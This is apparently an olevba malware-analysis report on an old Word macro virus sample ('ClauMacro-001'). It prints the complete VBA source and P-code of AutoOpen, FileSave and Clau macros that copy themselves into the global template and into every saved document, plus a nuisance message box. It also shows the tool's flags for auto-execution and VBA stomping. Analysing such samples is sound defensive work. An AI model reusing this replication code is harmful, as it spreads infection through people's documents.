olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Concept.dq
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Concept.dq - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Concept.dq - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim cMacro$
On Error GoTo -1: On Error GoTo abort
'add FileSave and copies of AutoOpen and FileSave.
cMe$ = WordBasic.[FileName$]()
cMacro$ = cMe$ + ":Clau"
WordBasic.MacroCopy cMacro$, "Global:Clau"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:FileSave"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:ClauFS"
cMacro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy cMacro$, "Global:ClauAO"
WordBasic.Call "Clau"
abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClauAO.bas 
in file: ./Virus.MSWord.Concept.dq - OLE stream: 'Macros/VBA/ClauAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim cMacro$
On Error GoTo -1: On Error GoTo abort
'add FileSave and copies of AutoOpen and FileSave.
cMe$ = WordBasic.[FileName$]()
cMacro$ = cMe$ + ":Clau"
WordBasic.MacroCopy cMacro$, "Global:Clau"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:FileSave"
cMacro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy cMacro$, "Global:ClauFS"
cMacro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy cMacro$, "Global:ClauAO"
WordBasic.Call "Clau"
abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ClauFS.bas 
in file: ./Virus.MSWord.Concept.dq - OLE stream: 'Macros/VBA/ClauFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cMe$
Dim c2Macro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
cMe$ = WordBasic.[FileName$]()
c2Macro$ = cMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauAO"
WordBasic.MacroCopy "Global:ClauAO", c2Macro$
c2Macro$ = cMe$ + ":ClauFS"
WordBasic.MacroCopy "Global:ClauFS", c2Macro$
c2Macro$ = cMe$ + ":Clau"
WordBasic.MacroCopy "Global:Clau", c2Macro$
WordBasic.FileSaveAs dlg
WordBasic.Call "Clau"
GoTo done

bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Clau.bas 
in file: ./Virus.MSWord.Concept.dq - OLE stream: 'Macros/VBA/Clau'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem Este destul pentru a dovedi...
If WordBasic.Day(WordBasic.Now()) = 1 Then WordBasic.MsgBox "Felicitari! Aveti un Macro Virus!!!", "ClauMacro-001 Virus from Romania 1998", 64
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Concept.dq
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AutoOpen - 1618 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn cMe
' Line #3:
' 	Dim 
' 	VarDefn cMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError abort 
' Line #5:
' 	QuoteRem 0x0000 0x0031 "add FileSave and copies of AutoOpen and FileSave."
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St cMe$ 
' Line #7:
' 	Ld cMe$ 
' 	LitStr 0x0005 ":Clau"
' 	Add 
' 	St cMacro$ 
' Line #8:
' 	Ld cMacro$ 
' 	LitStr 0x000B "Global:Clau"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauFS"
' 	Add 
' 	St cMacro$ 
' Line #10:
' 	Ld cMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauFS"
' 	Add 
' 	St cMacro$ 
' Line #12:
' 	Ld cMacro$ 
' 	LitStr 0x000D "Global:ClauFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauAO"
' 	Add 
' 	St cMacro$ 
' Line #14:
' 	Ld cMacro$ 
' 	LitStr 0x000D "Global:ClauAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	LitStr 0x0004 "Clau"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #16:
' 	Label abort 
' Line #17:
' 	EndSub 
' Macros/VBA/ClauAO - 1615 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn cMe
' Line #3:
' 	Dim 
' 	VarDefn cMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError abort 
' Line #5:
' 	QuoteRem 0x0000 0x0031 "add FileSave and copies of AutoOpen and FileSave."
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St cMe$ 
' Line #7:
' 	Ld cMe$ 
' 	LitStr 0x0005 ":Clau"
' 	Add 
' 	St cMacro$ 
' Line #8:
' 	Ld cMacro$ 
' 	LitStr 0x000B "Global:Clau"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauFS"
' 	Add 
' 	St cMacro$ 
' Line #10:
' 	Ld cMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauFS"
' 	Add 
' 	St cMacro$ 
' Line #12:
' 	Ld cMacro$ 
' 	LitStr 0x000D "Global:ClauFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauAO"
' 	Add 
' 	St cMacro$ 
' Line #14:
' 	Ld cMacro$ 
' 	LitStr 0x000D "Global:ClauAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	LitStr 0x0004 "Clau"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #16:
' 	Label abort 
' Line #17:
' 	EndSub 
' Macros/VBA/ClauFS - 2137 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn cMe
' Line #3:
' 	Dim 
' 	VarDefn c2Macro
' Line #4:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError bail 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St cMe$ 
' Line #11:
' 	Ld cMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St c2Macro$ 
' Line #12:
' 	LitStr 0x000D "Global:ClauAO"
' 	Ld c2Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauAO"
' 	Add 
' 	St c2Macro$ 
' Line #14:
' 	LitStr 0x000D "Global:ClauAO"
' 	Ld c2Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld cMe$ 
' 	LitStr 0x0007 ":ClauFS"
' 	Add 
' 	St c2Macro$ 
' Line #16:
' 	LitStr 0x000D "Global:ClauFS"
' 	Ld c2Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld cMe$ 
' 	LitStr 0x0005 ":Clau"
' 	Add 
' 	St c2Macro$ 
' Line #18:
' 	LitStr 0x000B "Global:Clau"
' 	Ld c2Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #20:
' 	LitStr 0x0004 "Clau"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #21:
' 	GoTo done 
' Line #22:
' Line #23:
' 	Label bail 
' Line #24:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Label done 
' Line #28:
' 	EndSub 
' Macros/VBA/Clau - 1171 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x001F " Este destul pentru a dovedi..."
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0023 "Felicitari! Aveti un Macro Virus!!!"
' 	LitStr 0x0025 "ClauMacro-001 Virus from Romania 1998"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' 	EndIf 
' Line #4:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

